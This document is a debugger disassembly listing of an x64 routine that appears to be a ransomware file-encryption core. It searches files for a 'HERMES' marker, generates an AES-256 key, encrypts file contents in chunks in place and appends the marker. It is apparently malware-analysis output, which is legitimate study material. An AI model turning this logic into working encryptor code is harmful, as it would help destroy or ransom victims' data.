0000000140003A30 | 40:55                    | push rbp                                |
0000000140003A32 | 53                       | push rbx                                |
0000000140003A33 | 56                       | push rsi                                | rsi:L"C:\\users\\Public\\PUBLIC"
0000000140003A34 | 57                       | push rdi                                |
0000000140003A35 | 41:56                    | push r14                                |
0000000140003A37 | 48:8DAC24 D0FEFFFF       | lea rbp,qword ptr ss:[rsp-130]          |
0000000140003A3F | 48:81EC 30020000         | sub rsp,230                             |
0000000140003A46 | 48:8B05 B3050200         | mov rax,qword ptr ds:[140024000]        |
0000000140003A4D | 48:33C4                  | xor rax,rsp                             |
0000000140003A50 | 48:8985 10010000         | mov qword ptr ss:[rbp+110],rax          |
0000000140003A57 | 33FF                     | xor edi,edi                             |
0000000140003A59 | 4C:894424 78             | mov qword ptr ss:[rsp+78],r8            | DWORD dwFileAttributes
0000000140003A5E | 4C:8BF2                  | mov r14,rdx                             |
0000000140003A61 | 48:897C24 40             | mov qword ptr ss:[rsp+40],rdi           |
0000000140003A66 | BA 80000000              | mov edx,80                              | LPCTSTR lpFileName = 80
0000000140003A6B | 48:897D B0               | mov qword ptr ss:[rbp-50],rdi           |
0000000140003A6F | 48:897D B8               | mov qword ptr ss:[rbp-48],rdi           |
0000000140003A73 | 41:8BF1                  | mov esi,r9d                             |
0000000140003A76 | 48:8BD9                  | mov rbx,rcx                             |
0000000140003A79 | FF15 31830200            | call qword ptr ds:[<&SetFileAttributesW | SetFileAttributesW
0000000140003A7F | 48:897C24 30             | mov qword ptr ss:[rsp+30],rdi           | HANDLE hTemplateFile
0000000140003A84 | 45:33C9                  | xor r9d,r9d                             | LPSECURITY_ATTRIBUTES lpSecurityAttributes
0000000140003A87 | C74424 28 80000000       | mov dword ptr ss:[rsp+28],80            | DWORD dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
0000000140003A8F | 45:33C0                  | xor r8d,r8d                             | DWORD dwShareMode
0000000140003A92 | BA 000000C0              | mov edx,C0000000                        | DWORD dwDesiredAccess = GENERIC_READ | GENERIC_WRITE
0000000140003A97 | C74424 20 03000000       | mov dword ptr ss:[rsp+20],3             | DWORD dwCreationDisposition = OPEN_EXISTING
0000000140003A9F | 48:8BCB                  | mov rcx,rbx                             | LPCTSTR lpFileName
0000000140003AA2 | FF15 68930200            | call qword ptr ds:[<&CreateFileW>]      | CreateFileW
0000000140003AA8 | 48:8BD8                  | mov rbx,rax                             |
0000000140003AAB | 48:85C0                  | test rax,rax                            |
0000000140003AAE | 75 0F                    | jne 140003ABF                           |
0000000140003AB0 | 33C9                     | xor ecx,ecx                             | HANDLE hObject
0000000140003AB2 | FF15 68930200            | call qword ptr ds:[<&CloseHandle>]      | CloseHandle
0000000140003AB8 | 33C0                     | xor eax,eax                             |
0000000140003ABA | E9 73090000              | jmp 140004432                           |
0000000140003ABF | 4C:89AC24 28020000       | mov qword ptr ss:[rsp+228],r13          |
0000000140003AC7 | 44:8BCF                  | mov r9d,edi                             |
0000000140003ACA | 48:897C24 58             | mov qword ptr ss:[rsp+58],rdi           |
0000000140003ACF | 4C:8BC7                  | mov r8,rdi                              |
0000000140003AD2 | 48:897C24 70             | mov qword ptr ss:[rsp+70],rdi           |
0000000140003AD7 | 48:83F8 FF               | cmp rax,FFFFFFFFFFFFFFFF                |
0000000140003ADB | 74 26                    | je 140003B03                            |
0000000140003ADD | 48:8D5424 58             | lea rdx,qword ptr ss:[rsp+58]           | PLARGE_INTEGER lpFileSize
0000000140003AE2 | 48:8BC8                  | mov rcx,rax                             | HANDLE hFile
0000000140003AE5 | FF15 05930200            | call qword ptr ds:[<&GetFileSizeEx>]    | GetFileSizeEx
0000000140003AEB | 48:8D5424 70             | lea rdx,qword ptr ss:[rsp+70]           | PLARGE_INTEGER lpFileSize
0000000140003AF0 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hFile
0000000140003AF3 | FF15 F7920200            | call qword ptr ds:[<&GetFileSizeEx>]    | GetFileSizeEx
0000000140003AF9 | 44:8B4C24 58             | mov r9d,dword ptr ss:[rsp+58]           |
0000000140003AFE | 4C:8B4424 70             | mov r8,qword ptr ss:[rsp+70]            |
0000000140003B03 | 41:BD FFFFFFFF           | mov r13d,FFFFFFFF                       |
0000000140003B09 | 4C:396C24 58             | cmp qword ptr ss:[rsp+58],r13           |
0000000140003B0E | 75 13                    | jne 140003B23                           |
0000000140003B10 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hObject
0000000140003B13 | FF15 07930200            | call qword ptr ds:[<&CloseHandle>]      | CloseHandle
0000000140003B19 | B8 01000000              | mov eax,1                               |
0000000140003B1E | E9 07090000              | jmp 14000442A                           |
0000000140003B23 | 4C:89A424 78020000       | mov qword ptr ss:[rsp+278],r12          |
0000000140003B2B | 49:BC DB34B6D782DE1B43   | mov r12,431BDE82D7B634DB                |
0000000140003B35 | 4C:89BC24 20020000       | mov qword ptr ss:[rsp+220],r15          |
0000000140003B3D | 44:8BFF                  | mov r15d,edi                            |
0000000140003B40 | 4C:897C24 68             | mov qword ptr ss:[rsp+68],r15           | [rsp+68]:EntryPoint
0000000140003B45 | 49:81F8 404B4C00         | cmp r8,4C4B40                           |
0000000140003B4C | 0F86 DC000000            | jbe 140003C2E                           |
0000000140003B52 | 49:6BC8 15               | imul rcx,r8,15                          |
0000000140003B56 | 49:BA 15AE47E17A14AE47   | mov r10,47AE147AE147AE15                |
0000000140003B60 | 49:8BC2                  | mov rax,r10                             |
0000000140003B63 | 48:F7E1                  | mul rcx                                 |
0000000140003B66 | 49:8BC4                  | mov rax,r12                             |
0000000140003B69 | 48:2BCA                  | sub rcx,rdx                             |
0000000140003B6C | 48:D1E9                  | shr rcx,1                               |
0000000140003B6F | 48:03CA                  | add rcx,rdx                             |
0000000140003B72 | 48:C1E9 06               | shr rcx,6                               |
0000000140003B76 | 48:F7E1                  | mul rcx                                 |
0000000140003B79 | 48:B9 003C534C10000000   | mov rcx,104C533C00                      |
0000000140003B83 | 48:C1EA 12               | shr rdx,12                              |
0000000140003B87 | 4C:3BC1                  | cmp r8,rcx                              |
0000000140003B8A | 76 3E                    | jbe 140003BCA                           |
0000000140003B8C | 49:8BC2                  | mov rax,r10                             |
0000000140003B8F | 49:8BC8                  | mov rcx,r8                              |
0000000140003B92 | 49:F7E0                  | mul r8                                  |
0000000140003B95 | 49:8BC4                  | mov rax,r12                             |
0000000140003B98 | 48:2BCA                  | sub rcx,rdx                             |
0000000140003B9B | 48:D1E9                  | shr rcx,1                               |
0000000140003B9E | 48:03CA                  | add rcx,rdx                             |
0000000140003BA1 | 48:C1E9 06               | shr rcx,6                               |
0000000140003BA5 | 48:F7E1                  | mul rcx                                 |
0000000140003BA8 | 4C:8BFA                  | mov r15,rdx                             | r15:L"C:\\users\\Public\\"
0000000140003BAB | 49:C1EF 12               | shr r15,12                              | r15:L"C:\\users\\Public\\"
0000000140003BAF | 4C:897C24 68             | mov qword ptr ss:[rsp+68],r15           | [rsp+68]:EntryPoint
0000000140003BB4 | 41:81FF A00F0000         | cmp r15d,FA0                            |
0000000140003BBB | 76 6C                    | jbe 140003C29                           |
0000000140003BBD | 41:BF 9F0F0000           | mov r15d,F9F                            |
0000000140003BC3 | 4C:897C24 68             | mov qword ptr ss:[rsp+68],r15           | [rsp+68]:EntryPoint
0000000140003BC8 | EB 64                    | jmp 140003C2E                           |
0000000140003BCA | 48:B8 FF0DFAD5FEFFFFFF   | mov rax,FFFFFFFED5FA0DFF                |
0000000140003BD4 | 48:B9 FE494D220F000000   | mov rcx,F224D49FE                       |
0000000140003BDE | 49:03C0                  | add rax,r8                              |
0000000140003BE1 | 48:3BC1                  | cmp rax,rcx                             |
0000000140003BE4 | 77 23                    | ja 140003C09                            |
0000000140003BE6 | 4B:8D0C40                | lea rcx,qword ptr ds:[r8+r8*2]          |
0000000140003BEA | 49:8BC2                  | mov rax,r10                             |
0000000140003BED | 48:F7E1                  | mul rcx                                 |
0000000140003BF0 | 49:8BC4                  | mov rax,r12                             |
0000000140003BF3 | 48:2BCA                  | sub rcx,rdx                             |
0000000140003BF6 | 48:D1E9                  | shr rcx,1                               |
0000000140003BF9 | 48:03CA                  | add rcx,rdx                             |
0000000140003BFC | 48:C1E9 06               | shr rcx,6                               |
0000000140003C00 | 48:F7E1                  | mul rcx                                 |
0000000140003C03 | 48:C1EA 12               | shr rdx,12                              |
0000000140003C07 | EB 10                    | jmp 140003C19                           |
0000000140003C09 | 48:B8 00F2052A01000000   | mov rax,12A05F200                       |
0000000140003C13 | 4C:3BC0                  | cmp r8,rax                              |
0000000140003C16 | 0F42D2                   | cmovb edx,edx                           |
0000000140003C19 | 44:8BFA                  | mov r15d,edx                            |
0000000140003C1C | 4C:897C24 68             | mov qword ptr ss:[rsp+68],r15           | [rsp+68]:EntryPoint
0000000140003C21 | 81FA A00F0000            | cmp edx,FA0                             |
0000000140003C27 | 77 0B                    | ja 140003C34                            |
0000000140003C29 | 45:85FF                  | test r15d,r15d                          |
0000000140003C2C | 74 06                    | je 140003C34                            |
0000000140003C2E | 49:83F8 19               | cmp r8,19                               |
0000000140003C32 | 73 13                    | jae 140003C47                           |
0000000140003C34 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hObject
0000000140003C37 | FF15 E3910200            | call qword ptr ds:[<&CloseHandle>]      | CloseHandle
0000000140003C3D | B8 02000000              | mov eax,2                               |
0000000140003C42 | E9 D3070000              | jmp 14000441A                           |
0000000140003C47 | 85F6                     | test esi,esi                            |
0000000140003C49 | 0F84 C6070000            | je 140004415                            |
0000000140003C4F | 49:81F8 22010000         | cmp r8,122                              |
0000000140003C56 | 0F86 CA000000            | jbe 140003D26                           |
0000000140003C5C | 41:81C1 DEFEFFFF         | add r9d,FFFFFEDE                        |
0000000140003C63 | 45:33C0                  | xor r8d,r8d                             | PLARGE_INTEGER lpNewFilePointer
0000000140003C66 | 44:894C24 58             | mov dword ptr ss:[rsp+58],r9d           |
0000000140003C6B | 48:8BCB                  | mov rcx,rbx                             | HANDLE hFile
0000000140003C6E | 48:8B5424 58             | mov rdx,qword ptr ss:[rsp+58]           | LARGE_INTEGER liDistanceToMove
0000000140003C73 | 45:33C9                  | xor r9d,r9d                             | DWORD dwMoveMethod
0000000140003C76 | FF15 7C940200            | call qword ptr ds:[<&SetFilePointerEx>] | SetFilePointerEx
0000000140003C7C | 41:3BC5                  | cmp eax,r13d                            |
0000000140003C7F | 75 0A                    | jne 140003C8B                           |
0000000140003C81 | B8 03000000              | mov eax,3                               |
0000000140003C86 | E9 8F070000              | jmp 14000441A                           |
0000000140003C8B | 4C:8D4D 80               | lea r9,qword ptr ss:[rbp-80]            | LPDWORD lpNumberOfBytesRead
0000000140003C8F | 897D 80                  | mov dword ptr ss:[rbp-80],edi           |
0000000140003C92 | 41:B8 19000000           | mov r8d,19                              | DWORD nNumberOfBytesToRead = 19
0000000140003C98 | 48:897C24 20             | mov qword ptr ss:[rsp+20],rdi           | LPOVERLAPPED lpOverlapped
0000000140003C9D | 48:8D55 C0               | lea rdx,qword ptr ss:[rbp-40]           | LPVOID lpBuffer
0000000140003CA1 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hFile
0000000140003CA4 | FF15 96910200            | call qword ptr ds:[<&ReadFile>]         | ReadFile
0000000140003CAA | 85C0                     | test eax,eax                            |
0000000140003CAC | 75 0A                    | jne 140003CB8                           |
0000000140003CAE | B8 04000000              | mov eax,4                               |
0000000140003CB3 | E9 62070000              | jmp 14000441A                           |
0000000140003CB8 | 48:63D0                  | movsxd rdx,eax                          |
0000000140003CBB | 8BCF                     | mov ecx,edi                             |
0000000140003CBD | 48:8D45 C1               | lea rax,qword ptr ss:[rbp-3F]           |
0000000140003CC1 | 48:85D2                  | test rdx,rdx                            |
0000000140003CC4 | 74 23                    | je 140003CE9                            |
0000000140003CC6 | 8078 FF 48               | cmp byte ptr ds:[rax-1],48              | 48:'H'
0000000140003CCA | 75 1D                    | jne 140003CE9                           |
0000000140003CCC | 8038 45                  | cmp byte ptr ds:[rax],45                | 45:'E'
0000000140003CCF | 75 18                    | jne 140003CE9                           |
0000000140003CD1 | 8078 01 52               | cmp byte ptr ds:[rax+1],52              | 52:'R'
0000000140003CD5 | 75 12                    | jne 140003CE9                           |
0000000140003CD7 | 8078 02 4D               | cmp byte ptr ds:[rax+2],4D              | 4D:'M'
0000000140003CDB | 75 0C                    | jne 140003CE9                           |
0000000140003CDD | 8078 03 45               | cmp byte ptr ds:[rax+3],45              | 45:'E'
0000000140003CE1 | 75 06                    | jne 140003CE9                           |
0000000140003CE3 | 8078 04 53               | cmp byte ptr ds:[rax+4],53              | 53:'S'
0000000140003CE7 | 74 2A                    | je 140003D13                            |
0000000140003CE9 | FFC1                     | inc ecx                                 |
0000000140003CEB | 48:FFC0                  | inc rax                                 |
0000000140003CEE | 83F9 14                  | cmp ecx,14                              |
0000000140003CF1 | 72 CE                    | jb 140003CC1                            |
0000000140003CF3 | 45:33C9                  | xor r9d,r9d                             | DWORD dwMoveMethod
0000000140003CF6 | 45:33C0                  | xor r8d,r8d                             | PLONG lpDistanceToMoveHigh
0000000140003CF9 | 33D2                     | xor edx,edx                             | LONG lDistanceToMove
0000000140003CFB | 48:8BCB                  | mov rcx,rbx                             | HANDLE hFile
0000000140003CFE | FF15 A4800200            | call qword ptr ds:[<&SetFilePointer>]   | SetFilePointer
0000000140003D04 | 41:3BC5                  | cmp eax,r13d                            |
0000000140003D07 | 75 1D                    | jne 140003D26                           |
0000000140003D09 | B8 06000000              | mov eax,6                               |
0000000140003D0E | E9 07070000              | jmp 14000441A                           |
0000000140003D13 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hObject
0000000140003D16 | FF15 04910200            | call qword ptr ds:[<&CloseHandle>]      | CloseHandle
0000000140003D1C | B8 05000000              | mov eax,5                               |
0000000140003D21 | E9 F4060000              | jmp 14000441A                           |
0000000140003D26 | 4C:8D4C24 40             | lea r9,qword ptr ss:[rsp+40]            | HCRYPTKEY* phKey
0000000140003D2B | BA 10660000              | mov edx,6610                            | unsigned int Algid = CALG_AES_256
0000000140003D30 | 41:B8 01000000           | mov r8d,1                               | DWORD dwFlags = 1
0000000140003D36 | 49:8BCE                  | mov rcx,r14                             | HCRYPTPROV hProv
0000000140003D39 | FF15 59800200            | call qword ptr ds:[<&CryptGenKey>]      | CryptGenKey
0000000140003D3F | 85C0                     | test eax,eax                            |
0000000140003D41 | 75 1E                    | jne 140003D61                           |
0000000140003D43 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hObject
0000000140003D46 | FF15 D4900200            | call qword ptr ds:[<&CloseHandle>]      | CloseHandle
0000000140003D4C | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           | HCRYPTKEY hKey
0000000140003D51 | FF15 B1473800            | call qword ptr ds:[<&CryptDestroyKey>]  | CryptDestroyKey
0000000140003D57 | B8 07000000              | mov eax,7                               |
0000000140003D5C | E9 B9060000              | jmp 14000441A                           |
0000000140003D61 | 4C:8B7424 70             | mov r14,qword ptr ss:[rsp+70]           |
0000000140003D66 | 49:81FE 404B4C00         | cmp r14,4C4B40                          |
0000000140003D6D | 0F86 B3000000            | jbe 140003E26                           |
0000000140003D73 | 41:69D7 40420F00         | imul edx,r15d,F4240                     |
0000000140003D7A | 45:33C9                  | xor r9d,r9d                             |
0000000140003D7D | 45:33C0                  | xor r8d,r8d                             |
0000000140003D80 | 48:8BCB                  | mov rcx,rbx                             |
0000000140003D83 | 45:8BEF                  | mov r13d,r15d                           |
0000000140003D86 | FF15 1C800200            | call qword ptr ds:[<&SetFilePointer>]   |
0000000140003D8C | BE FFFFFFFF              | mov esi,FFFFFFFF                        |
0000000140003D91 | 48:8BCB                  | mov rcx,rbx                             |
0000000140003D94 | 3BC6                     | cmp eax,esi                             |
0000000140003D96 | 75 1B                    | jne 140003DB3                           |
0000000140003D98 | FF15 82900200            | call qword ptr ds:[<&CloseHandle>]      |
0000000140003D9E | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           | HCRYPTKEY hKey
0000000140003DA3 | FF15 5F473800            | call qword ptr ds:[<&CryptDestroyKey>]  | CryptDestroyKey
0000000140003DA9 | B8 08000000              | mov eax,8                               |
0000000140003DAE | E9 67060000              | jmp 14000441A                           |
0000000140003DB3 | 4C:8D4D 80               | lea r9,qword ptr ss:[rbp-80]            |
0000000140003DB7 | 897D 80                  | mov dword ptr ss:[rbp-80],edi           |
0000000140003DBA | 41:B8 10000000           | mov r8d,10                              |
0000000140003DC0 | 48:897C24 20             | mov qword ptr ss:[rsp+20],rdi           |
0000000140003DC5 | 48:8D55 B0               | lea rdx,qword ptr ss:[rbp-50]           |
0000000140003DC9 | FF15 71900200            | call qword ptr ds:[<&ReadFile>]         |
0000000140003DCF | 48:8BCB                  | mov rcx,rbx                             |
0000000140003DD2 | 85C0                     | test eax,eax                            |
0000000140003DD4 | 75 1B                    | jne 140003DF1                           |
0000000140003DD6 | FF15 44900200            | call qword ptr ds:[<&CloseHandle>]      |
0000000140003DDC | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           | HCRYPTKEY hKey
0000000140003DE1 | FF15 21473800            | call qword ptr ds:[<&CryptDestroyKey>]  | CryptDestroyKey
0000000140003DE7 | B8 09000000              | mov eax,9                               | 9:'\t'
0000000140003DEC | E9 29060000              | jmp 14000441A                           |
0000000140003DF1 | 45:33C9                  | xor r9d,r9d                             |
0000000140003DF4 | 45:33C0                  | xor r8d,r8d                             |
0000000140003DF7 | 33D2                     | xor edx,edx                             |
0000000140003DF9 | FF15 A97F0200            | call qword ptr ds:[<&SetFilePointer>]   |
0000000140003DFF | 3BC6                     | cmp eax,esi                             |
0000000140003E01 | 75 1E                    | jne 140003E21                           |
0000000140003E03 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hObject
0000000140003E06 | FF15 14900200            | call qword ptr ds:[<&CloseHandle>]      | CloseHandle
0000000140003E0C | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           | HCRYPTKEY hKey
0000000140003E11 | FF15 F1463800            | call qword ptr ds:[<&CryptDestroyKey>]  | CryptDestroyKey
0000000140003E17 | B8 0A000000              | mov eax,A                               | A:'\n'
0000000140003E1C | E9 F9050000              | jmp 14000441A                           |
0000000140003E21 | 897D A0                  | mov dword ptr ss:[rbp-60],edi           |
0000000140003E24 | EB 1B                    | jmp 140003E41                           |
0000000140003E26 | 49:8BC4                  | mov rax,r12                             |
0000000140003E29 | 49:F7E6                  | mul r14                                 |
0000000140003E2C | 4C:8BEA                  | mov r13,rdx                             |
0000000140003E2F | 49:C1ED 12               | shr r13,12                              |
0000000140003E33 | 41:69C5 40420F00         | imul eax,r13d,F4240                     |
0000000140003E3A | 44:2BF0                  | sub r14d,eax                            |
0000000140003E3D | 4C:8975 A0               | mov qword ptr ss:[rbp-60],r14           |
0000000140003E41 | 33C9                     | xor ecx,ecx                             | LPVOID lpAddress
0000000140003E43 | BA 9A420F00              | mov edx,F429A                           | SIZE_T dwSize = F429A
0000000140003E48 | 41:B8 00100000           | mov r8d,1000                            | DWORD flAllocationType = MEM_COMMIT
0000000140003E4E | 44:8D49 04               | lea r9d,qword ptr ds:[rcx+4]            | DWORD flProtect
0000000140003E52 | FF15 487F0200            | call qword ptr ds:[<&VirtualAlloc>]     | VirtualAlloc
0000000140003E58 | 48:8BF0                  | mov rsi,rax                             | rsi:L"C:\\users\\Public\\PUBLIC"
0000000140003E5B | 48:85C0                  | test rax,rax                            |
0000000140003E5E | 75 1C                    | jne 140003E7C                           |
0000000140003E60 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hObject
0000000140003E63 | FF15 B78F0200            | call qword ptr ds:[<&CloseHandle>]      | CloseHandle
0000000140003E69 | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           | HCRYPTKEY hKey
0000000140003E6E | FF15 94463800            | call qword ptr ds:[<&CryptDestroyKey>]  | CryptDestroyKey
0000000140003E74 | 8D46 0B                  | lea eax,qword ptr ds:[rsi+B]            |
0000000140003E77 | E9 9E050000              | jmp 14000441A                           |
0000000140003E7C | C74424 4C 40420F00       | mov dword ptr ss:[rsp+4C],F4240         |
0000000140003E84 | 44:8BF7                  | mov r14d,edi                            |
0000000140003E87 | 44:8BE7                  | mov r12d,edi                            |
0000000140003E8A | 66:0F1F4400 00           | nop word ptr ds:[rax+rax],ax            |
0000000140003E90 | C74424 48 40420F00       | mov dword ptr ss:[rsp+48],F4240         |
0000000140003E98 | 44:8BFF                  | mov r15d,edi                            |
0000000140003E9B | 45:3BF5                  | cmp r14d,r13d                           |
0000000140003E9E | 75 0E                    | jne 140003EAE                           |
0000000140003EA0 | 48:8B45 A0               | mov rax,qword ptr ss:[rbp-60]           |
0000000140003EA4 | 41:BF 01000000           | mov r15d,1                              |
0000000140003EAA | 894424 48                | mov dword ptr ss:[rsp+48],eax           |
0000000140003EAE | 45:33C9                  | xor r9d,r9d                             | DWORD dwMoveMethod
0000000140003EB1 | 897C24 50                | mov dword ptr ss:[rsp+50],edi           |
0000000140003EB5 | 45:33C0                  | xor r8d,r8d                             | PLONG lpDistanceToMoveHigh
0000000140003EB8 | 41:8BD4                  | mov edx,r12d                            | LONG lDistanceToMove
0000000140003EBB | 48:8BCB                  | mov rcx,rbx                             | HANDLE hFile
0000000140003EBE | FF15 E47E0200            | call qword ptr ds:[<&SetFilePointer>]   | SetFilePointer
0000000140003EC4 | B9 FFFFFFFF              | mov ecx,FFFFFFFF                        |
0000000140003EC9 | 3BC1                     | cmp eax,ecx                             |
0000000140003ECB | 48:8BCB                  | mov rcx,rbx                             |
0000000140003ECE | 0F84 56060000            | je 14000452A                            |
0000000140003ED4 | 44:8B4424 48             | mov r8d,dword ptr ss:[rsp+48]           |
0000000140003ED9 | 4C:8D4C24 50             | lea r9,qword ptr ss:[rsp+50]            |
0000000140003EDE | 48:8BD6                  | mov rdx,rsi                             | rsi:L"C:\\users\\Public\\PUBLIC"
0000000140003EE1 | 48:897C24 20             | mov qword ptr ss:[rsp+20],rdi           |
0000000140003EE6 | FF15 548F0200            | call qword ptr ds:[<&ReadFile>]         |
0000000140003EEC | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           |
0000000140003EF1 | 85C0                     | test eax,eax                            |
0000000140003EF3 | 0F84 07060000            | je 140004500                            |
0000000140003EF9 | 48:8D4424 4C             | lea rax,qword ptr ss:[rsp+4C]           |
0000000140003EFE | 897C24 30                | mov dword ptr ss:[rsp+30],edi           | DWORD dwFlags
0000000140003F02 | 48:894424 28             | mov qword ptr ss:[rsp+28],rax           | DWORD* pdwDataLen
0000000140003F07 | 45:33C9                  | xor r9d,r9d                             | BOOL Final
0000000140003F0A | 45:8BC7                  | mov r8d,r15d                            | HCRYPTHASH hHash
0000000140003F0D | 48:897C24 20             | mov qword ptr ss:[rsp+20],rdi           | BYTE* pbData
0000000140003F12 | 33D2                     | xor edx,edx                             | HCRYPTKEY hKey
0000000140003F14 | C74424 4C 40420F00       | mov dword ptr ss:[rsp+4C],F4240         | DWORD dwBufLen = F4240
0000000140003F1C | FF15 0E7F0200            | call qword ptr ds:[<&CryptEncrypt>]     | CryptEncrypt
0000000140003F22 | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           |
0000000140003F27 | 85C0                     | test eax,eax                            |
0000000140003F29 | 0F84 A7050000            | je 1400044D6                            |
0000000140003F2F | 8B4424 4C                | mov eax,dword ptr ss:[rsp+4C]           |
0000000140003F33 | 45:33C9                  | xor r9d,r9d                             |
0000000140003F36 | 894424 30                | mov dword ptr ss:[rsp+30],eax           |
0000000140003F3A | 45:8BC7                  | mov r8d,r15d                            |
0000000140003F3D | 48:8D4424 48             | lea rax,qword ptr ss:[rsp+48]           |
0000000140003F42 | 33D2                     | xor edx,edx                             |
0000000140003F44 | 48:894424 28             | mov qword ptr ss:[rsp+28],rax           |
0000000140003F49 | 48:897424 20             | mov qword ptr ss:[rsp+20],rsi           |
0000000140003F4E | FF15 DC7E0200            | call qword ptr ds:[<&CryptEncrypt>]     |
0000000140003F54 | 85C0                     | test eax,eax                            |
0000000140003F56 | 0F84 4B050000            | je 1400044A7                            |
0000000140003F5C | 45:33C9                  | xor r9d,r9d                             | DWORD dwMoveMethod
0000000140003F5F | 45:33C0                  | xor r8d,r8d                             | PLONG lpDistanceToMoveHigh
0000000140003F62 | 41:8BD4                  | mov edx,r12d                            | LONG lDistanceToMove
0000000140003F65 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hFile
0000000140003F68 | FF15 3A7E0200            | call qword ptr ds:[<&SetFilePointer>]   | SetFilePointer
0000000140003F6E | 41:BF FFFFFFFF           | mov r15d,FFFFFFFF                       |
0000000140003F74 | 48:8BCB                  | mov rcx,rbx                             |
0000000140003F77 | 41:3BC7                  | cmp eax,r15d                            |
0000000140003F7A | 0F84 FB040000            | je 14000447B                            |
0000000140003F80 | 44:8B4424 48             | mov r8d,dword ptr ss:[rsp+48]           | LPCVOID lpBuffer
0000000140003F85 | 4C:8D4C24 50             | lea r9,qword ptr ss:[rsp+50]            | DWORD nNumberOfBytesToWrite
0000000140003F8A | 48:8BD6                  | mov rdx,rsi                             | HANDLE hFile = "C:\\users\\Public\\PUBLIC"
0000000140003F8D | 897C24 50                | mov dword ptr ss:[rsp+50],edi           | LPOVERLAPPED lpOverlapped
0000000140003F91 | 48:897C24 20             | mov qword ptr ss:[rsp+20],rdi           | LPDWORD lpNumberOfBytesWritten
0000000140003F96 | FF15 EC3F3800            | call qword ptr ds:[<&WriteFile>]        | WriteFile
0000000140003F9C | 85C0                     | test eax,eax                            |
0000000140003F9E | 0F84 AB040000            | je 14000444F                            |
0000000140003FA4 | 41:FFC6                  | inc r14d                                |
0000000140003FA7 | 41:81C4 40420F00         | add r12d,F4240                          |
0000000140003FAE | 45:3BF5                  | cmp r14d,r13d                           |
0000000140003FB1 | 0F86 D9FEFFFF            | jbe 140003E90                           |
0000000140003FB7 | 48:817C24 70 404B4C00    | cmp qword ptr ss:[rsp+70],4C4B40        |
0000000140003FC0 | 48:897D 88               | mov qword ptr ss:[rbp-78],rdi           |
0000000140003FC4 | 48:897D 90               | mov qword ptr ss:[rbp-70],rdi           |
0000000140003FC8 | 66:897D 98               | mov word ptr ss:[rbp-68],di             |
0000000140003FCC | C745 80 4845524D         | mov dword ptr ss:[rbp-80],4D524548      |
0000000140003FD3 | 66:C745 84 4553          | mov word ptr ss:[rbp-7C],5345           |
0000000140003FD9 | 40:887D 86               | mov byte ptr ss:[rbp-7A],dil            |
0000000140003FDD | 0F86 6F010000            | jbe 140004152                           |
0000000140003FE3 | 41:B9 02000000           | mov r9d,2                               | DWORD dwMoveMethod = FILE_END
0000000140003FE9 | 48:897D A0               | mov qword ptr ss:[rbp-60],rdi           |
0000000140003FED | 45:33C0                  | xor r8d,r8d                             | PLARGE_INTEGER lpNewFilePointer
0000000140003FF0 | 48:8BD7                  | mov rdx,rdi                             | LARGE_INTEGER liDistanceToMove
0000000140003FF3 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hFile
0000000140003FF6 | FF15 FC900200            | call qword ptr ds:[<&SetFilePointerEx>] | SetFilePointerEx
0000000140003FFC | 8B4C24 68                | mov ecx,dword ptr ss:[rsp+68]           |
0000000140004000 | 48:8D55 A0               | lea rdx,qword ptr ss:[rbp-60]           |
0000000140004004 | 48:897D A0               | mov qword ptr ss:[rbp-60],rdi           |
0000000140004008 | 66:897D A8               | mov word ptr ss:[rbp-58],di             |
000000014000400C | E8 DFD7FFFF              | call 1400017F0                          |
0000000140004011 | B9 01000000              | mov ecx,1                               |
0000000140004016 | 40:387D 89               | cmp byte ptr ss:[rbp-77],dil            |
000000014000401A | 74 14                    | je 140004030                            |
000000014000401C | 48:8D45 89               | lea rax,qword ptr ss:[rbp-77]           |
0000000140004020 | FFC1                     | inc ecx                                 |
0000000140004022 | 48:8D40 01               | lea rax,qword ptr ds:[rax+1]            |
0000000140004026 | 40:3838                  | cmp byte ptr ds:[rax],dil               |
0000000140004029 | 75 F5                    | jne 140004020                           |
000000014000402B | 0F1F4400 00              | nop dword ptr ds:[rax+rax],eax          |
0000000140004030 | 8BC1                     | mov eax,ecx                             |
0000000140004032 | 41:B9 01000000           | mov r9d,1                               |
0000000140004038 | C64405 88 7C             | mov byte ptr ss:[rbp+rax-78],7C         | 7C:'|'
000000014000403D | 8D41 01                  | lea eax,qword ptr ds:[rcx+1]            |
0000000140004040 | 40:887C05 88             | mov byte ptr ss:[rbp+rax-78],dil        |
0000000140004045 | 40:387D 89               | cmp byte ptr ss:[rbp-77],dil            |
0000000140004049 | 74 11                    | je 14000405C                            |
000000014000404B | 48:8D45 89               | lea rax,qword ptr ss:[rbp-77]           |
000000014000404F | 90                       | nop                                     |
0000000140004050 | 41:FFC1                  | inc r9d                                 |
0000000140004053 | 48:8D40 01               | lea rax,qword ptr ds:[rax+1]            |
0000000140004057 | 40:3838                  | cmp byte ptr ds:[rax],dil               |
000000014000405A | 75 F4                    | jne 140004050                           |
000000014000405C | 41:B8 01000000           | mov r8d,1                               |
0000000140004062 | 40:387D A1               | cmp byte ptr ss:[rbp-5F],dil            |
0000000140004066 | 74 14                    | je 14000407C                            |
0000000140004068 | 48:8D45 A1               | lea rax,qword ptr ss:[rbp-5F]           |
000000014000406C | 0F1F40 00                | nop dword ptr ds:[rax],eax              |
0000000140004070 | 41:FFC0                  | inc r8d                                 |
0000000140004073 | 48:8D40 01               | lea rax,qword ptr ds:[rax+1]            |
0000000140004077 | 40:3838                  | cmp byte ptr ds:[rax],dil               |
000000014000407A | 75 F4                    | jne 140004070                           |
000000014000407C | 8BD7                     | mov edx,edi                             |
000000014000407E | 45:85C0                  | test r8d,r8d                            |
